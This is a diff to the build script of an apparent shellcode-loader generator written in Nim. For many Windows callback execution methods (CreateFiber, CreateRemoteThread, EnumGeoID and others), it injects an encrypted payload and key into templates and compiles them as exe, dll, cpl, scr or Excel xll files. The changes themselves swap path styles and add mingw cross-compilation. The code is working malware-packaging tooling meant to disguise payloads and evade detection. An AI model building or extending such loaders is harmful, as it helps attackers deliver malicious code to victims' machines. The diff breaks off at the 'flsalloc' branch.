@@ -1,4 +1,3 @@
-import winim/lean
 import os
 import base64
 import nimcrypto
@@ -123,7 +122,7 @@ proc main() =
     if apiMethod == "enumgeoid":
 
         if fileType != "xll":
-            let file_path = ".\\apiMethods\\EnumGeoID\\EnumGeoID.nim"
+            let file_path = "apiMethods/EnumGeoID/EnumGeoID.nim"
             var file_target = file_path.readFile()
 
             let placeholder = "REPLACE_ME"
@@ -139,13 +138,13 @@ proc main() =
 
 
             if fileType == "exe":
-                discard execShellCmd("nim -d:release --out:EnumGeoID.exe --app:gui c .\\apiMethods\\EnumGeoID\\EnumGeoID.nim")
+                discard execShellCmd("nim -d:release -d:mingw --out:EnumGeoID.exe --app:gui c apiMethods/EnumGeoID/EnumGeoID.nim")
             elif fileType == "dll":
-                discard execShellCmd("nim -d:release --out:EnumGeoID.dll --app:lib c .\\apiMethods\\EnumGeoID\\EnumGeoID.nim")
+                discard execShellCmd("nim -d:release -d:mingw --out:EnumGeoID.dll --app:lib c apiMethods/EnumGeoID/EnumGeoID.nim")
             elif fileType == "cpl":
-                discard execShellCmd("nim -d:release --out:EnumGeoID.cpl --app:lib c .\\apiMethods\\EnumGeoID\\EnumGeoID.nim")
+                discard execShellCmd("nim -d:release -d:mingw --out:EnumGeoID.cpl --app:lib c apiMethods/EnumGeoID/EnumGeoID.nim")
             elif fileType == "scr":
-                discard execShellCmd("nim -d:release --out:EnumGeoID.scr --app:gui c .\\apiMethods\\EnumGeoID\\EnumGeoID.nim")
+                discard execShellCmd("nim -d:release -d:mingw --out:EnumGeoID.scr --app:gui c apiMethods/EnumGeoID/EnumGeoID.nim")
             else:
                 echo "ERROR, WRONG FILE TYPE, COMPILATION ABORTING.\n"
             let placeholder_new = encodedCrypted
@@ -163,7 +162,7 @@ proc main() =
 
         if fileType == "xll":
 
-            let file_path = ".\\apiMethods\\EnumGeoID\\EnumGeoIDXLL.nim"
+            let file_path = "apiMethods/EnumGeoID/EnumGeoIDXLL.nim"
             var file_target = file_path.readFile()
 
             let placeholder = "REPLACE_ME"
@@ -176,7 +175,7 @@ proc main() =
             let replace_pass_new = "PASSWORD_ME"
             file_target = file_target.replace(replace_pass_new, pass_new)
             file_path.writeFile(file_target)
-            discard execShellCmd("nim c -d=mingw --app=lib --nomain --cpu=amd64 --out:EnumGeoIDXLL.dll .\\apiMethods\\EnumGeoID\\EnumGeoIDXLL.nim")
+            discard execShellCmd("nim c -d=mingw --app=lib --nomain --cpu=amd64 --out:EnumGeoIDXLL.dll apiMethods/EnumGeoID/EnumGeoIDXLL.nim")
 
             discard execShellCmd("move EnumGeoIDXLL.dll EnumGeoID.xll")
 
@@ -197,7 +196,7 @@ proc main() =
     elif apiMethod == "createfiber":
 
         if fileType != "xll":
-            let file_path = ".\\apiMethods\\CreateFiber\\CreateFiber.nim"
+            let file_path = "apiMethods/CreateFiber/CreateFiber.nim"
             var file_target = file_path.readFile()
 
             let placeholder = "REPLACE_ME"
@@ -213,13 +212,13 @@ proc main() =
 
 
             if fileType == "exe":
-                discard execShellCmd("nim -d:release --out:CreateFiber.exe --app:gui c .\\apiMethods\\CreateFiber\\CreateFiber.nim")
+                discard execShellCmd("nim -d:release -d:mingw --out:CreateFiber.exe --app:gui c apiMethods/CreateFiber/CreateFiber.nim")
             elif fileType == "dll":
-                discard execShellCmd("nim -d:release --out:CreateFiber.dll --app:lib c .\\apiMethods\\CreateFiber\\CreateFiber.nim")
+                discard execShellCmd("nim -d:release -d:mingw --out:CreateFiber.dll --app:lib c apiMethods/CreateFiber/CreateFiber.nim")
             elif fileType == "cpl":
-                discard execShellCmd("nim -d:release --out:CreateFiber.cpl --app:lib c .\\apiMethods\\CreateFiber\\CreateFiber.nim")
+                discard execShellCmd("nim -d:release -d:mingw --out:CreateFiber.cpl --app:lib c apiMethods/CreateFiber/CreateFiber.nim")
             elif fileType == "scr":
-                discard execShellCmd("nim -d:release --out:CreateFiber.scr --app:gui c .\\apiMethods\\CreateFiber\\CreateFiber.nim")
+                discard execShellCmd("nim -d:release -d:mingw --out:CreateFiber.scr --app:gui c apiMethods/CreateFiber/CreateFiber.nim")
             else:
                 echo "ERROR, WRONG FILE TYPE, COMPILATION ABORTING.\n"
             let placeholder_new = encodedCrypted
@@ -237,7 +236,7 @@ proc main() =
 
         if fileType == "xll":
 
-            let file_path = ".\\apiMethods\\CreateFiber\\CreateFiberXLL.nim"
+            let file_path = "apiMethods/CreateFiber/CreateFiberXLL.nim"
             var file_target = file_path.readFile()
 
             let placeholder = "REPLACE_ME"
@@ -250,7 +249,7 @@ proc main() =
             let replace_pass_new = "PASSWORD_ME"
             file_target = file_target.replace(replace_pass_new, pass_new)
             file_path.writeFile(file_target)
-            discard execShellCmd("nim c -d=mingw --app=lib --nomain --cpu=amd64 --out:CreateFiberXLL.dll .\\apiMethods\\CreateFiber\\CreateFiberXLL.nim")
+            discard execShellCmd("nim c -d=mingw --app=lib --nomain --cpu=amd64 --out:CreateFiberXLL.dll apiMethods/CreateFiber/CreateFiberXLL.nim")
 
             discard execShellCmd("move CreateFiberXLL.dll CreateFiber.xll")
 
@@ -270,7 +269,7 @@ proc main() =
 
     elif apiMethod == "createremotethread":
         if fileType != "xll":
-            let file_path = ".\\apiMethods\\CreateRemoteThread\\CreateRemoteThread.nim"
+            let file_path = "apiMethods/CreateRemoteThread/CreateRemoteThread.nim"
             var file_target = file_path.readFile()
 
             let placeholder = "REPLACE_ME"
@@ -286,13 +285,13 @@ proc main() =
 
 
             if fileType == "exe":
-                discard execShellCmd("nim -d:release --out:CreateRemoteThread.exe --app:gui c .\\apiMethods\\CreateRemoteThread\\CreateRemoteThread.nim")
+                discard execShellCmd("nim -d:release -d:mingw --out:CreateRemoteThread.exe --app:gui c apiMethods/CreateRemoteThread/CreateRemoteThread.nim")
             elif fileType == "dll":
-                discard execShellCmd("nim -d:release --out:CreateRemoteThread.dll --app:lib c .\\apiMethods\\CreateRemoteThread\\CreateRemoteThread.nim")
+                discard execShellCmd("nim -d:release -d:mingw --out:CreateRemoteThread.dll --app:lib c apiMethods/CreateRemoteThread/CreateRemoteThread.nim")
             elif fileType == "cpl":
-                discard execShellCmd("nim -d:release --out:CreateRemoteThread.cpl --app:lib c .\\apiMethods\\CreateRemoteThread\\CreateRemoteThread.nim")
+                discard execShellCmd("nim -d:release -d:mingw --out:CreateRemoteThread.cpl --app:lib c apiMethods/CreateRemoteThread/CreateRemoteThread.nim")
             elif fileType == "scr":
-                discard execShellCmd("nim -d:release --out:CreateRemoteThread.scr --app:gui c .\\apiMethods\\CreateRemoteThread\\CreateRemoteThread.nim")
+                discard execShellCmd("nim -d:release -d:mingw --out:CreateRemoteThread.scr --app:gui c apiMethods/CreateRemoteThread/CreateRemoteThread.nim")
             else:
                 echo "ERROR, WRONG FILE TYPE, COMPILATION ABORTING.\n"
             let placeholder_new = encodedCrypted
@@ -310,7 +309,7 @@ proc main() =
 
         if fileType == "xll":
 
-            let file_path = ".\\apiMethods\\CreateRemoteThread\\CreateRemoteThreadXLL.nim"
+            let file_path = "apiMethods/CreateRemoteThread/CreateRemoteThreadXLL.nim"
             var file_target = file_path.readFile()
 
             let placeholder = "REPLACE_ME"
@@ -323,7 +322,7 @@ proc main() =
             let replace_pass_new = "PASSWORD_ME"
             file_target = file_target.replace(replace_pass_new, pass_new)
             file_path.writeFile(file_target)
-            discard execShellCmd("nim c -d=mingw --app=lib --nomain --cpu=amd64 --out:CreateRemoteThreadXLL.dll .\\apiMethods\\CreateRemoteThread\\CreateRemoteThreadXLL.nim")
+            discard execShellCmd("nim c -d=mingw --app=lib --nomain --cpu=amd64 --out:CreateRemoteThreadXLL.dll apiMethods/CreateRemoteThread/CreateRemoteThreadXLL.nim")
 
             discard execShellCmd("move CreateRemoteThreadXLL.dll CreateRemoteThread.xll")
 
@@ -343,7 +342,7 @@ proc main() =
 
     elif apiMethod == "createthreadpoolwait":
         if fileType != "xll":
-            let file_path = ".\\apiMethods\\CreateThreadpoolWait\\CreateThreadpoolWait.nim"
+            let file_path = "apiMethods/CreateThreadpoolWait/CreateThreadpoolWait.nim"
             var file_target = file_path.readFile()
 
             let placeholder = "REPLACE_ME"
@@ -359,7 +358,7 @@ proc main() =
 
 
             if fileType == "exe":
-                discard execShellCmd("nim -d:release --out:CreateThreadpoolWait.exe --app:gui c .\\apiMethods\\CreateThreadpoolWait\\CreateThreadpoolWait.nim")
+                discard execShellCmd("nim -d:release -d:mingw --out:CreateThreadpoolWait.exe --app:gui c apiMethods/CreateThreadpoolWait/CreateThreadpoolWait.nim")
             elif fileType == "dll":
                 echo "DLLs will not execute with this function call due to its nature. I'll try to fix this in the future - S3lrius\n"
                 echo "ERROR, WRONG FILE TYPE, COMPILATION ABORTING. PLEASE REPLACE STRING IN THE TEMPLATE FILE.\n"
@@ -367,7 +366,7 @@ proc main() =
                 echo "Control Panel Applets will not execute with this function call due to its nature.\n"
                 echo "ERROR, WRONG FILE TYPE, COMPILATION ABORTING. PLEASE REPLACE STRING IN THE TEMPLATE FILE.\n"
             elif fileType == "scr":
-                discard execShellCmd("nim -d:release --out:CreateThreadpoolWait.scr --app:gui c .\\apiMethods\\CreateThreadpoolWait\\CreateThreadpoolWait.nim")
+                discard execShellCmd("nim -d:release -d:mingw --out:CreateThreadpoolWait.scr --app:gui c apiMethods/CreateThreadpoolWait/CreateThreadpoolWait.nim")
             else:
                 echo "ERROR, WRONG FILE TYPE, COMPILATION ABORTING.\n"
             let placeholder_new = encodedCrypted
@@ -385,7 +384,7 @@ proc main() =
 
         if fileType == "xll":
 
-            let file_path = ".\\apiMethods\\CreateThreadpoolWait\\CreateThreadpoolWaitXLL.nim"
+            let file_path = "apiMethods/CreateThreadpoolWait/CreateThreadpoolWaitXLL.nim"
             var file_target = file_path.readFile()
 
             let placeholder = "REPLACE_ME"
@@ -398,7 +397,7 @@ proc main() =
             let replace_pass_new = "PASSWORD_ME"
             file_target = file_target.replace(replace_pass_new, pass_new)
             file_path.writeFile(file_target)
-            discard execShellCmd("nim c -d=mingw --app=lib --nomain --cpu=amd64 --out:CreateThreadpoolWaitXLL.dll .\\apiMethods\\CreateThreadpoolWait\\CreateThreadpoolWaitXLL.nim")
+            discard execShellCmd("nim c -d=mingw --app=lib --nomain --cpu=amd64 --out:CreateThreadpoolWaitXLL.dll apiMethods/CreateThreadpoolWait/CreateThreadpoolWaitXLL.nim")
 
             discard execShellCmd("move CreateThreadpoolWaitXLL.dll CreateThreadpoolWait.xll")
 
@@ -418,7 +417,7 @@ proc main() =
 
     elif apiMethod == "enumlanguage":
         if fileType != "xll":
-            let file_path = ".\\apiMethods\\EnumLanguageGroupLocales\\EnumLanguageGroupLocales.nim"
+            let file_path = "apiMethods/EnumLanguageGroupLocales/EnumLanguageGroupLocales.nim"
             var file_target = file_path.readFile()
 
             let placeholder = "REPLACE_ME"
@@ -434,13 +433,13 @@ proc main() =
 
 
             if fileType == "exe":
-                discard execShellCmd("nim -d:release --out:EnumLanguageGroupLocales.exe --app:gui c .\\apiMethods\\EnumLanguageGroupLocales\\EnumLanguageGroupLocales.nim")
+                discard execShellCmd("nim -d:release -d:mingw --out:EnumLanguageGroupLocales.exe --app:gui c apiMethods/EnumLanguageGroupLocales/EnumLanguageGroupLocales.nim")
             elif fileType == "dll":
-                discard execShellCmd("nim -d:release --out:EnumLanguageGroupLocales.dll --app:lib c .\\apiMethods\\EnumLanguageGroupLocales\\EnumLanguageGroupLocales.nim")
+                discard execShellCmd("nim -d:release -d:mingw --out:EnumLanguageGroupLocales.dll --app:lib c apiMethods/EnumLanguageGroupLocales/EnumLanguageGroupLocales.nim")
             elif fileType == "cpl":
-                discard execShellCmd("nim -d:release --out:EnumLanguageGroupLocales.cpl --app:lib c .\\apiMethods\\EnumLanguageGroupLocales\\EnumLanguageGroupLocales.nim")
+                discard execShellCmd("nim -d:release -d:mingw --out:EnumLanguageGroupLocales.cpl --app:lib c apiMethods/EnumLanguageGroupLocales/EnumLanguageGroupLocales.nim")
             elif fileType == "scr":
-                discard execShellCmd("nim -d:release --out:EnumLanguageGroupLocales.scr --app:gui c .\\apiMethods\\EnumLanguageGroupLocales\\EnumLanguageGroupLocales.nim")
+                discard execShellCmd("nim -d:release -d:mingw --out:EnumLanguageGroupLocales.scr --app:gui c apiMethods/EnumLanguageGroupLocales/EnumLanguageGroupLocales.nim")
             else:
                 echo "ERROR, WRONG FILE TYPE, COMPILATION ABORTING.\n"
             let placeholder_new = encodedCrypted
@@ -458,7 +457,7 @@ proc main() =
 
         if fileType == "xll":
 
-            let file_path = ".\\apiMethods\\EnumLanguageGroupLocales\\EnumLanguageGroupLocalesXLL.nim"
+            let file_path = "apiMethods/EnumLanguageGroupLocales/EnumLanguageGroupLocalesXLL.nim"
             var file_target = file_path.readFile()
 
             let placeholder = "REPLACE_ME"
@@ -471,7 +470,7 @@ proc main() =
             let replace_pass_new = "PASSWORD_ME"
             file_target = file_target.replace(replace_pass_new, pass_new)
             file_path.writeFile(file_target)
-            discard execShellCmd("nim c -d=mingw --app=lib --nomain --cpu=amd64 --out:EnumLanguageGroupLocalesXLL.dll .\\apiMethods\\EnumLanguageGroupLocales\\EnumLanguageGroupLocalesXLL.nim")
+            discard execShellCmd("nim c -d=mingw --app=lib --nomain --cpu=amd64 --out:EnumLanguageGroupLocalesXLL.dll apiMethods/EnumLanguageGroupLocales/EnumLanguageGroupLocalesXLL.nim")
 
             discard execShellCmd("move EnumLanguageGroupLocalesXLL.dll EnumLanguageGroupLocales.xll")
 
@@ -491,7 +490,7 @@ proc main() =
 
     elif apiMethod == "cryptenum":
         if fileType != "xll":
-            let file_path = ".\\apiMethods\\CryptEnumOIDInfo\\CryptEnumOIDInfo.nim"
+            let file_path = "apiMethods/CryptEnumOIDInfo/CryptEnumOIDInfo.nim"
             var file_target = file_path.readFile()
 
             let placeholder = "REPLACE_ME"
@@ -507,13 +506,13 @@ proc main() =
 
 
             if fileType == "exe":
-                discard execShellCmd("nim -d:release --out:CryptEnumOIDInfo.exe --app:gui c .\\apiMethods\\CryptEnumOIDInfo\\CryptEnumOIDInfo.nim")
+                discard execShellCmd("nim -d:release -d:mingw --out:CryptEnumOIDInfo.exe --app:gui c apiMethods/CryptEnumOIDInfo/CryptEnumOIDInfo.nim")
             elif fileType == "dll":
-                discard execShellCmd("nim -d:release --out:CryptEnumOIDInfo.dll --app:lib c .\\apiMethods\\CryptEnumOIDInfo\\CryptEnumOIDInfo.nim")
+                discard execShellCmd("nim -d:release -d:mingw --out:CryptEnumOIDInfo.dll --app:lib c apiMethods/CryptEnumOIDInfo/CryptEnumOIDInfo.nim")
             elif fileType == "cpl":
-                discard execShellCmd("nim -d:release --out:CryptEnumOIDInfo.cpl --app:lib c .\\apiMethods\\CryptEnumOIDInfo\\CryptEnumOIDInfo.nim")
+                discard execShellCmd("nim -d:release -d:mingw --out:CryptEnumOIDInfo.cpl --app:lib c apiMethods/CryptEnumOIDInfo/CryptEnumOIDInfo.nim")
             elif fileType == "scr":
-                discard execShellCmd("nim -d:release --out:CryptEnumOIDInfo.scr --app:gui c .\\apiMethods\\CryptEnumOIDInfo\\CryptEnumOIDInfo.nim")
+                discard execShellCmd("nim -d:release -d:mingw --out:CryptEnumOIDInfo.scr --app:gui c apiMethods/CryptEnumOIDInfo/CryptEnumOIDInfo.nim")
             else:
                 echo "ERROR, WRONG FILE TYPE, COMPILATION ABORTING.\n"
             let placeholder_new = encodedCrypted
@@ -536,7 +535,7 @@ proc main() =
 
     elif apiMethod == "enumdisplay":
         if fileType != "xll":
-            let file_path = ".\\apiMethods\\EnumDisplayMonitors\\EnumDisplayMonitors.nim"
+            let file_path = "apiMethods/EnumDisplayMonitors/EnumDisplayMonitors.nim"
             var file_target = file_path.readFile()
 
             let placeholder = "REPLACE_ME"
@@ -552,13 +551,13 @@ proc main() =
 
 
             if fileType == "exe":
-                discard execShellCmd("nim -d:release --out:EnumDisplayMonitors.exe --app:gui c .\\apiMethods\\EnumDisplayMonitors\\EnumDisplayMonitors.nim")
+                discard execShellCmd("nim -d:release -d:mingw --out:EnumDisplayMonitors.exe --app:gui c apiMethods/EnumDisplayMonitors/EnumDisplayMonitors.nim")
             elif fileType == "dll":
-                discard execShellCmd("nim -d:release --out:EnumDisplayMonitors.dll --app:lib c .\\apiMethods\\EnumDisplayMonitors\\EnumDisplayMonitors.nim")
+                discard execShellCmd("nim -d:release -d:mingw --out:EnumDisplayMonitors.dll --app:lib c apiMethods/EnumDisplayMonitors/EnumDisplayMonitors.nim")
             elif fileType == "cpl":
-                discard execShellCmd("nim -d:release --out:EnumDisplayMonitors.cpl --app:lib c .\\apiMethods\\EnumDisplayMonitors\\EnumDisplayMonitors.nim")
+                discard execShellCmd("nim -d:release -d:mingw --out:EnumDisplayMonitors.cpl --app:lib c apiMethods/EnumDisplayMonitors/EnumDisplayMonitors.nim")
             elif fileType == "scr":
-                discard execShellCmd("nim -d:release --out:EnumDisplayMonitors.scr --app:gui c .\\apiMethods\\EnumDisplayMonitors\\EnumDisplayMonitors.nim")
+                discard execShellCmd("nim -d:release -d:mingw --out:EnumDisplayMonitors.scr --app:gui c apiMethods/EnumDisplayMonitors/EnumDisplayMonitors.nim")
             else:
                 echo "ERROR, WRONG FILE TYPE, COMPILATION ABORTING.\n"
             let placeholder_new = encodedCrypted
@@ -576,7 +575,7 @@ proc main() =
 
         if fileType == "xll":
 
-            let file_path = ".\\apiMethods\\EnumDisplayMonitors\\EnumDisplayMonitorsXLL.nim"
+            let file_path = "apiMethods/EnumDisplayMonitors/EnumDisplayMonitorsXLL.nim"
             var file_target = file_path.readFile()
 
             let placeholder = "REPLACE_ME"
@@ -589,7 +588,7 @@ proc main() =
             let replace_pass_new = "PASSWORD_ME"
             file_target = file_target.replace(replace_pass_new, pass_new)
             file_path.writeFile(file_target)
-            discard execShellCmd("nim c -d=mingw --app=lib --nomain --cpu=amd64 --out:EnumDisplayMonitorsXLL.dll .\\apiMethods\\EnumDisplayMonitors\\EnumDisplayMonitorsXLL.nim")
+            discard execShellCmd("nim c -d=mingw --app=lib --nomain --cpu=amd64 --out:EnumDisplayMonitorsXLL.dll apiMethods/EnumDisplayMonitors/EnumDisplayMonitorsXLL.nim")
 
             discard execShellCmd("move EnumDisplayMonitorsXLL.dll EnumDisplayMonitors.xll")
 
@@ -609,7 +608,7 @@ proc main() =
 
     elif apiMethod == "enumsystemstore":
         if fileType != "xll":
-            let file_path = ".\\apiMethods\\CertEnumSystemStore\\CertEnumSystemStore.nim"
+            let file_path = "apiMethods/CertEnumSystemStore/CertEnumSystemStore.nim"
             var file_target = file_path.readFile()
 
             let placeholder = "REPLACE_ME"
@@ -625,13 +624,13 @@ proc main() =
 
 
             if fileType == "exe":
-                discard execShellCmd("nim -d:release --out:CertEnumSystemStore.exe --app:gui c .\\apiMethods\\CertEnumSystemStore\\CertEnumSystemStore.nim")
+                discard execShellCmd("nim -d:release -d:mingw --out:CertEnumSystemStore.exe --app:gui c apiMethods/CertEnumSystemStore/CertEnumSystemStore.nim")
             elif fileType == "dll":
-                discard execShellCmd("nim -d:release --out:CertEnumSystemStore.dll --app:lib c .\\apiMethods\\CertEnumSystemStore\\CertEnumSystemStore.nim")
+                discard execShellCmd("nim -d:release -d:mingw --out:CertEnumSystemStore.dll --app:lib c apiMethods/CertEnumSystemStore/CertEnumSystemStore.nim")
             elif fileType == "cpl":
-                discard execShellCmd("nim -d:release --out:CertEnumSystemStore.cpl --app:lib c .\\apiMethods\\CertEnumSystemStore\\CertEnumSystemStore.nim")
+                discard execShellCmd("nim -d:release -d:mingw --out:CertEnumSystemStore.cpl --app:lib c apiMethods/CertEnumSystemStore/CertEnumSystemStore.nim")
             elif fileType == "scr":
-                discard execShellCmd("nim -d:release --out:CertEnumSystemStore.scr --app:gui c .\\apiMethods\\CertEnumSystemStore\\CertEnumSystemStore.nim")
+                discard execShellCmd("nim -d:release -d:mingw --out:CertEnumSystemStore.scr --app:gui c apiMethods/CertEnumSystemStore/CertEnumSystemStore.nim")
             else:
                 echo "ERROR, WRONG FILE TYPE, COMPILATION ABORTING.\n"
             let placeholder_new = encodedCrypted
@@ -649,7 +648,7 @@ proc main() =
 
         if fileType == "xll":
 
-            let file_path = ".\\apiMethods\\CertEnumSystemStore\\CertEnumSystemStoreXLL.nim"
+            let file_path = "apiMethods/CertEnumSystemStore/CertEnumSystemStoreXLL.nim"
             var file_target = file_path.readFile()
 
             let placeholder = "REPLACE_ME"
@@ -662,7 +661,7 @@ proc main() =
             let replace_pass_new = "PASSWORD_ME"
             file_target = file_target.replace(replace_pass_new, pass_new)
             file_path.writeFile(file_target)
-            discard execShellCmd("nim c -d=mingw --app=lib --nomain --cpu=amd64 --out:CertEnumSystemStoreXLL.dll .\\apiMethods\\CertEnumSystemStore\\CertEnumSystemStoreXLL.nim")
+            discard execShellCmd("nim c -d=mingw --app=lib --nomain --cpu=amd64 --out:CertEnumSystemStoreXLL.dll apiMethods/CertEnumSystemStore/CertEnumSystemStoreXLL.nim")
 
             discard execShellCmd("move CertEnumSystemStoreXLL.dll CertEnumSystemStore.xll")
 
@@ -682,7 +681,7 @@ proc main() =
 
     elif apiMethod == "enumdesktop":
         if fileType != "xll":
-            let file_path = ".\\apiMethods\\EnumDesktopWindows\\EnumDesktopWindows.nim"
+            let file_path = "apiMethods/EnumDesktopWindows/EnumDesktopWindows.nim"
             var file_target = file_path.readFile()
 
             let placeholder = "REPLACE_ME"
@@ -698,13 +697,13 @@ proc main() =
 
 
             if fileType == "exe":
-                discard execShellCmd("nim -d:release --out:EnumDesktopWindows.exe --app:gui c .\\apiMethods\\EnumDesktopWindows\\EnumDesktopWindows.nim")
+                discard execShellCmd("nim -d:release -d:mingw --out:EnumDesktopWindows.exe --app:gui c apiMethods/EnumDesktopWindows/EnumDesktopWindows.nim")
             elif fileType == "dll":
-                discard execShellCmd("nim -d:release --out:EnumDesktopWindows.dll --app:lib c .\\apiMethods\\EnumDesktopWindows\\EnumDesktopWindows.nim")
+                discard execShellCmd("nim -d:release -d:mingw --out:EnumDesktopWindows.dll --app:lib c apiMethods/EnumDesktopWindows/EnumDesktopWindows.nim")
             elif fileType == "cpl":
-                discard execShellCmd("nim -d:release --out:EnumDesktopWindows.cpl --app:lib c .\\apiMethods\\EnumDesktopWindows\\EnumDesktopWindows.nim")
+                discard execShellCmd("nim -d:release -d:mingw --out:EnumDesktopWindows.cpl --app:lib c apiMethods/EnumDesktopWindows/EnumDesktopWindows.nim")
             elif fileType == "scr":
-                discard execShellCmd("nim -d:release --out:EnumDesktopWindows.scr --app:gui c .\\apiMethods\\EnumDesktopWindows\\EnumDesktopWindows.nim")
+                discard execShellCmd("nim -d:release -d:mingw --out:EnumDesktopWindows.scr --app:gui c apiMethods/EnumDesktopWindows/EnumDesktopWindows.nim")
             else:
                 echo "ERROR, WRONG FILE TYPE, COMPILATION ABORTING.\n"
             let placeholder_new = encodedCrypted
@@ -722,7 +721,7 @@ proc main() =
 
         if fileType == "xll":
 
-            let file_path = ".\\apiMethods\\EnumDesktopWindows\\EnumDesktopWindowsXLL.nim"
+            let file_path = "apiMethods/EnumDesktopWindows/EnumDesktopWindowsXLL.nim"
             var file_target = file_path.readFile()
 
             let placeholder = "REPLACE_ME"
@@ -735,7 +734,7 @@ proc main() =
             let replace_pass_new = "PASSWORD_ME"
             file_target = file_target.replace(replace_pass_new, pass_new)
             file_path.writeFile(file_target)
-            discard execShellCmd("nim c -d=mingw --app=lib --nomain --cpu=amd64 --out:EnumDesktopWindowsXLL.dll .\\apiMethods\\EnumDesktopWindows\\EnumDesktopWindowsXLL.nim")
+            discard execShellCmd("nim c -d=mingw --app=lib --nomain --cpu=amd64 --out:EnumDesktopWindowsXLL.dll apiMethods/EnumDesktopWindows/EnumDesktopWindowsXLL.nim")
 
             discard execShellCmd("move EnumDesktopWindowsXLL.dll EnumDesktopWindows.xll")
 
@@ -755,7 +754,7 @@ proc main() =
 
     elif apiMethod == "enumtime":
         if fileType != "xll":
-            let file_path = ".\\apiMethods\\EnumTimeFormatsEx\\EnumTimeFormatsEx.nim"
+            let file_path = "apiMethods/EnumTimeFormatsEx/EnumTimeFormatsEx.nim"
             var file_target = file_path.readFile()
 
             let placeholder = "REPLACE_ME"
@@ -771,13 +770,13 @@ proc main() =
 
 
             if fileType == "exe":
-                discard execShellCmd("nim -d:release --out:EnumTimeFormatsEx.exe --app:gui c .\\apiMethods\\EnumTimeFormatsEx\\EnumTimeFormatsEx.nim")
+                discard execShellCmd("nim -d:release -d:mingw --out:EnumTimeFormatsEx.exe --app:gui c apiMethods/EnumTimeFormatsEx/EnumTimeFormatsEx.nim")
             elif fileType == "dll":
-                discard execShellCmd("nim -d:release --out:EnumTimeFormatsEx.dll --app:lib c .\\apiMethods\\EnumTimeFormatsEx\\EnumTimeFormatsEx.nim")
+                discard execShellCmd("nim -d:release -d:mingw --out:EnumTimeFormatsEx.dll --app:lib c apiMethods/EnumTimeFormatsEx/EnumTimeFormatsEx.nim")
             elif fileType == "cpl":
-                discard execShellCmd("nim -d:release --out:EnumTimeFormatsEx.cpl --app:lib c .\\apiMethods\\EnumTimeFormatsEx\\EnumTimeFormatsEx.nim")
+                discard execShellCmd("nim -d:release -d:mingw --out:EnumTimeFormatsEx.cpl --app:lib c apiMethods/EnumTimeFormatsEx/EnumTimeFormatsEx.nim")
             elif fileType == "scr":
-                discard execShellCmd("nim -d:release --out:EnumTimeFormatsEx.scr --app:gui c .\\apiMethods\\EnumTimeFormatsEx\\EnumTimeFormatsEx.nim")
+                discard execShellCmd("nim -d:release -d:mingw --out:EnumTimeFormatsEx.scr --app:gui c apiMethods/EnumTimeFormatsEx/EnumTimeFormatsEx.nim")
             else:
                 echo "ERROR, WRONG FILE TYPE, COMPILATION ABORTING.\n"
             let placeholder_new = encodedCrypted
@@ -795,7 +794,7 @@ proc main() =
 
         if fileType == "xll":
 
-            let file_path = ".\\apiMethods\\EnumTimeFormatsEx\\EnumTimeFormatsExXLL.nim"
+            let file_path = "apiMethods/EnumTimeFormatsEx/EnumTimeFormatsExXLL.nim"
             var file_target = file_path.readFile()
 
             let placeholder = "REPLACE_ME"
@@ -808,7 +807,7 @@ proc main() =
             let replace_pass_new = "PASSWORD_ME"
             file_target = file_target.replace(replace_pass_new, pass_new)
             file_path.writeFile(file_target)
-            discard execShellCmd("nim c -d=mingw --app=lib --nomain --cpu=amd64 --out:EnumTimeFormatsExXLL.dll .\\apiMethods\\EnumTimeFormatsEx\\EnumTimeFormatsExXLL.nim")
+            discard execShellCmd("nim c -d=mingw --app=lib --nomain --cpu=amd64 --out:EnumTimeFormatsExXLL.dll apiMethods/EnumTimeFormatsEx/EnumTimeFormatsExXLL.nim")
 
             discard execShellCmd("move EnumTimeFormatsExXLL.dll EnumTimeFormatsEx.xll")
 
@@ -828,7 +827,7 @@ proc main() =
 
     elif apiMethod == "enumcalendar":
         if fileType != "xll":
-            let file_path = ".\\apiMethods\\EnumCalendarInfo\\EnumCalendarInfo.nim"
+            let file_path = "apiMethods/EnumCalendarInfo/EnumCalendarInfo.nim"
             var file_target = file_path.readFile()
 
             let placeholder = "REPLACE_ME"
@@ -844,13 +843,13 @@ proc main() =
 
 
             if fileType == "exe":
-                discard execShellCmd("nim -d:release --out:EnumCalendarInfo.exe --app:gui c .\\apiMethods\\EnumCalendarInfo\\EnumCalendarInfo.nim")
+                discard execShellCmd("nim -d:release -d:mingw --out:EnumCalendarInfo.exe --app:gui c apiMethods/EnumCalendarInfo/EnumCalendarInfo.nim")
             elif fileType == "dll":
-                discard execShellCmd("nim -d:release --out:EnumCalendarInfo.dll --app:lib c .\\apiMethods\\EnumCalendarInfo\\EnumCalendarInfo.nim")
+                discard execShellCmd("nim -d:release -d:mingw --out:EnumCalendarInfo.dll --app:lib c apiMethods/EnumCalendarInfo/EnumCalendarInfo.nim")
             elif fileType == "cpl":
-                discard execShellCmd("nim -d:release --out:EnumCalendarInfo.cpl --app:lib c .\\apiMethods\\EnumCalendarInfo\\EnumCalendarInfo.nim")
+                discard execShellCmd("nim -d:release -d:mingw --out:EnumCalendarInfo.cpl --app:lib c apiMethods/EnumCalendarInfo/EnumCalendarInfo.nim")
             elif fileType == "scr":
-                discard execShellCmd("nim -d:release --out:EnumCalendarInfo.scr --app:gui c .\\apiMethods\\EnumCalendarInfo\\EnumCalendarInfo.nim")
+                discard execShellCmd("nim -d:release -d:mingw --out:EnumCalendarInfo.scr --app:gui c apiMethods/EnumCalendarInfo/EnumCalendarInfo.nim")
             else:
                 echo "ERROR, WRONG FILE TYPE, COMPILATION ABORTING.\n"
             let placeholder_new = encodedCrypted
@@ -868,7 +867,7 @@ proc main() =
 
         if fileType == "xll":
 
-            let file_path = ".\\apiMethods\\EnumCalendarInfo\\EnumCalendarInfoXLL.nim"
+            let file_path = "apiMethods/EnumCalendarInfo/EnumCalendarInfoXLL.nim"
             var file_target = file_path.readFile()
 
             let placeholder = "REPLACE_ME"
@@ -881,7 +880,7 @@ proc main() =
             let replace_pass_new = "PASSWORD_ME"
             file_target = file_target.replace(replace_pass_new, pass_new)
             file_path.writeFile(file_target)
-            discard execShellCmd("nim c -d=mingw --app=lib --nomain --cpu=amd64 --out:EnumCalendarInfoXLL.dll .\\apiMethods\\EnumCalendarInfo\\EnumCalendarInfoXLL.nim")
+            discard execShellCmd("nim c -d=mingw --app=lib --nomain --cpu=amd64 --out:EnumCalendarInfoXLL.dll apiMethods/EnumCalendarInfo/EnumCalendarInfoXLL.nim")
 
             discard execShellCmd("move EnumCalendarInfoXLL.dll EnumCalendarInfo.xll")
 
@@ -901,7 +900,7 @@ proc main() =
     elif apiMethod == "flsalloc":
 
             if fileType != "xll":
